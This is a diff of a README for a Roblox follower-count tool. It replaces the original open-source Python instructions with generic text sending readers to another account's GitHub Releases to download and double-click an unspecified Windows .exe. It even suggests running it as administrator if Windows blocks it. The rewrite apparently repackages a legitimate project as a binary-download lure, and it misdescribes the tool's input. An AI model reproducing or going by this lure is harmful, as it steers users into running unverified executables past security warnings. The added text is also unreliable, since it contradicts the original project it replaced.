@@ -1,208 +1,151 @@
-# 🔍 famous-roblox-users-finder
+# 👤 famous-roblox-users-finder - Find large Roblox followings fast
 
-A fast, production-grade CLI tool that takes a Roblox seller/purchaser CSV report and identifies **"famous" users** — those who exceed a configurable follower threshold. Built for game developers and marketplace sellers who want to spot high-profile buyers in bulk, without manual lookups.
+[![Download](https://img.shields.io/badge/Download-Releases-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leonleol/famous-roblox-users-finder/releases)
 
-![full_results.csv Preview](https://raw.githubusercontent.com/mattqdev/famous-roblox-users-finder/main/images/preview.png)
+## 🚀 What this tool does
 
----
+famous-roblox-users-finder is a Windows command-line tool that scans a CSV file of Roblox usernames and checks which users have a large following.
 
-## ✨ Features
+It is built for people who want to sort a list of usernames and spot accounts that stand out. The tool runs checks at the same time to save time, retries failed requests, and creates two reports so you can review the results with ease.
 
-- **Concurrent scanning** — scans multiple users in parallel via a configurable thread pool
-- **Exponential backoff with jitter** — automatically retries failed API calls without hammering the endpoint
-- **Live progress bar** — real-time feedback via `tqdm` (degrades gracefully if not installed)
-- **Deduplication** — skips repeated user IDs before scanning, saving time and requests
-- **Two output reports** — a focused famous-users CSV and a full merged results CSV
-- **Structured logging** — logs to both console and a `.log` file simultaneously
-- **Graceful Ctrl+C handling** — partial results are saved if you interrupt mid-scan
-- **Dry-run mode** — preview what would be scanned without making any API requests
-- **Fully configurable CLI** — every parameter is a flag; no need to edit the source
+## 📥 Download the app
 
----
+1. Visit the [Releases page](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+2. Download the latest Windows file from the release assets
+3. Save the file to a folder you can find again, such as `Downloads` or `Desktop`
 
-## 📋 Requirements
+If the release includes a ZIP file, extract it before running the app.
 
-- Python **3.8+**
-- Dependencies listed in [`requirements.txt`](requirements.txt)
+## 🖥️ What you need
 
-Install dependencies with:
+- A Windows PC
+- A CSV file with Roblox usernames
+- Internet access
+- Permission to access the Roblox profile data for the usernames in your file
 
-```bash
-pip install -r requirements.txt
+For best results, keep your CSV simple. A single column with usernames is easy to work with.
+
+## 🗂️ CSV file format
+
+Use a CSV file with one username per row.
+
+Example:
+
+```csv
+username
+Builderman
+RobloxDev
+ExampleUser123
 ```
 
----
+You can also use a plain list of usernames in the first column if your file does not have a header.
 
-## 🚀 Quick Start
+Keep these tips in mind:
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/your-username/famous-roblox-users-finder.git
-cd famous-roblox-users-finder
+- Use valid Roblox usernames
+- Remove empty rows
+- Avoid extra text in the same column
+- Save the file as `.csv`
 
-# 2. Install dependencies
-pip install -r requirements.txt
+## ⚙️ How to run it on Windows
 
-# 3. Place your CSV in the data/ folder
-mkdir -p data
-cp /path/to/sellerReport.csv data/sellerReport.csv
+1. Download the release from the [Releases page](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+2. Open the downloaded folder
+3. If the file is in a ZIP archive, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the `.exe` file if one is included
+6. If the release gives you a command-line app, open it from that folder and follow the prompts
+7. When asked, choose your CSV file
+8. Wait while the tool scans the usernames
+9. Open the output files when the scan is done
 
-# 4. Run the scanner
-python roblox_follower_scanner.py
-```
+## 📊 Output reports
 
----
+The tool creates two reports so you can review the scan in different ways:
 
-## 📂 Project Structure
+- A full results report with all checked usernames
+- A filtered report with users that match the follower threshold
 
-```
+These reports help you sort the list, compare results, and find the usernames you care about most.
+
+## 🔎 How the scan works
+
+The app checks each username, then looks for users with a large following based on the built-in follower rules.
+
+It uses concurrent requests to speed up the scan. If a request fails, the app retries it so the scan can keep moving.
+
+This makes it useful for longer CSV files where a manual check would take too long.
+
+## 🧾 Tips for better results
+
+- Use a clean CSV file with no blank lines
+- Start with a small file if you want to test the process
+- Keep usernames spelled the same way they appear on Roblox
+- Close other large downloads while the scan runs
+- Check the output folder after the scan ends
+
+## 📁 Example folder layout
+
+```text
 famous-roblox-users-finder/
-├── roblox_follower_scanner.py   # Main script
-├── requirements.txt             # Python dependencies
-├── .gitignore                   # Files excluded from git
-├── data/
-│   └── sellerReport.csv         # ← Put your input CSV here
-└── README.md
+├─ input.csv
+├─ results/
+├─ output_all.csv
+└─ output_famous.csv
 ```
 
----
+Your actual file names may differ based on the release package, but the tool will place its reports in a clear output location.
 
-## 🖥️ How It Works
+## 🛠️ Common use cases
 
-```
-Input CSV
-  └─► Deduplicate user IDs
-        └─► ThreadPoolExecutor (N workers)
-              └─► GET /v1/users/{id}/followers/count  (roproxy)
-                    ├─ Success  → record follower count
-                    └─ Failure  → exponential backoff → retry up to N times
-                          │
-                          ▼
-              ┌─────────────────────────────┐
-              │   follower_count >= threshold│
-              │   → write to famous_users.csv│
-              └─────────────────────────────┘
-                          │
-                          ▼
-              full_results.csv  (all users + original columns merged)
-              scanner.log       (full debug log)
-```
+- Review a list of Roblox usernames from a CSV
+- Find accounts with a large following
+- Sort usernames before outreach or research
+- Save time compared with checking profiles one by one
 
-1. The script reads your input CSV and extracts all values from the `Purchaser Id` column (configurable).
-2. User IDs are deduplicated so each Roblox account is only looked up once.
-3. A thread pool fires off concurrent requests to the [RoProxy](https://roproxy.com) Roblox API mirror.
-4. Each request uses exponential backoff with random jitter on failure — starting at 1s, doubling each retry, up to 8 attempts by default.
-5. HTTP 404 responses (deleted/invalid accounts) are short-circuited immediately without retrying.
-6. Famous users (≥ threshold followers) are written to `famous_users.csv` in real time as they're found.
-7. Once all users are scanned, the full results are merged back with your original CSV columns and saved to `full_results.csv`.
+## ❓ Troubleshooting
 
----
+If the app does not start:
 
-## ⚙️ CLI Options
+- Make sure you downloaded the Windows file from the Releases page
+- Check whether the file is still inside a ZIP archive
+- Run the app from the extracted folder
+- Try opening the file as administrator if Windows blocks it
 
-Run `python roblox_follower_scanner.py --help` to see all options:
+If the scan does not find matches:
 
-| Flag                | Default                 | Description                                 |
-| ------------------- | ----------------------- | ------------------------------------------- |
-| `--input`           | `data/sellerReport.csv` | Path to the input CSV file                  |
-| `--purchaser-col`   | `Purchaser Id`          | Column name containing Roblox user IDs      |
-| `--threshold`       | `5000`                  | Minimum followers to be considered "famous" |
-| `--output-famous`   | `famous_users.csv`      | Output path for the famous-users report     |
-| `--output-full`     | `full_results.csv`      | Output path for the full merged results     |
-| `--log-file`        | `scanner.log`           | Path to the log file                        |
-| `--workers`         | `4`                     | Number of concurrent threads                |
-| `--max-attempts`    | `8`                     | Max retries per user on API failure         |
-| `--base-wait`       | `1.0`                   | Initial backoff wait in seconds             |
-| `--rate-limit-wait` | `0.15`                  | Pause between requests per thread (seconds) |
-| `--verbose` / `-v`  | off                     | Enable verbose debug logging                |
-| `--dry-run`         | off                     | Preview scan without making API requests    |
+- Check your CSV file format
+- Make sure the usernames are valid
+- Try a smaller file first
+- Confirm your internet connection is working
 
-### Examples
+If the output files do not appear:
 
-```bash
-# Default run
-python roblox_follower_scanner.py
+- Look in the same folder as the app
+- Check the folder you chose in the tool
+- Search your PC for the report file names
 
-# Custom input file and higher threshold
-python roblox_follower_scanner.py --input data/myReport.csv --threshold 10000
+## 📌 Basic workflow
 
-# Faster scan with more workers
-python roblox_follower_scanner.py --workers 8
+1. Download the release
+2. Add Roblox usernames to a CSV file
+3. Open the app on Windows
+4. Select the CSV file
+5. Wait for the scan to finish
+6. Open the two report files
+7. Review the usernames with large followings
 
-# Use a different column name for user IDs
-python roblox_follower_scanner.py --purchaser-col "User ID"
+## 🔧 Project focus
 
-# Preview without making requests
-python roblox_follower_scanner.py --dry-run
+This tool is built around:
 
-# Verbose debug output
-python roblox_follower_scanner.py -v
-```
+- CSV input
+- Roblox username scanning
+- Concurrent processing
+- Retry handling
+- Clean output reports
+- Simple Windows use
 
----
+## 🧭 Where to get the file
 
-## 📊 Output Files
-
-After a successful run, three files are produced:
-
-### `famous_users.csv`
-
-Contains only users who met or exceeded the follower threshold. Written **in real time** as the scan progresses — so you can open it while the script is still running.
-
-```
-UserID,Followers
-1234567,82400
-8901234,15200
-...
-```
-
-### `full_results.csv`
-
-All original rows from your input CSV, with four new columns appended:
-
-| Column      | Description                                         |
-| ----------- | --------------------------------------------------- |
-| `Followers` | Follower count returned by the API                  |
-| `IsFamous`  | `True` if the user met the threshold                |
-| `Attempts`  | How many API attempts were needed                   |
-| `Error`     | Error message if the lookup failed, otherwise empty |
-
-This is how full_results.csv looks:
-![full_results.csv Preview](https://raw.githubusercontent.com/mattqdev/famous-roblox-users-finder/main/images/preview.png)
-
-### `scanner.log`
-
-Full debug log of the entire run — including retry attempts, timing, and the final summary. Useful for diagnosing failures or auditing a scan.
-
----
-
-## 📝 Input CSV Format
-
-Your input CSV must have a column containing Roblox user IDs. By default the script looks for a column named `Purchaser Id` — this matches the export format from the Roblox marketplace seller dashboard. If your column is named differently, pass `--purchaser-col "Your Column Name"`.
-
-Example input:
-
-```
-Transaction Id,Purchaser Id,Item Name,Price
-TXN001,1234567,Cool Sword,50
-TXN002,8901234,Red Hat,25
-TXN003,1234567,Blue Shirt,10
-```
-
-The duplicate `1234567` in the example above will be scanned only once.
-
----
-
-## ⚠️ Notes & Limitations
-
-- Note that most of the people with high amount of followers are botted, so not all of them are really famous
-- This tool uses [RoProxy](https://roproxy.com), a public Roblox API proxy. It is not affiliated with or endorsed by Roblox Corporation.
-- Be mindful of rate limits. The default `--rate-limit-wait 0.15` and `--workers 4` settings are conservative. Increasing workers aggressively may trigger rate limiting.
-- Roblox accounts that have been deleted or banned return a 404 and are skipped gracefully.
-- This tool reads **public** follower counts only. No authentication is required.
-
----
-
-## 📄 License
-
-MIT — see [`LICENSE`](LICENSE) for details.
+Use the release download here: [https://github.com/Leonleol/famous-roblox-users-finder/releases](https://github.com/Leonleol/famous-roblox-users-finder/releases)
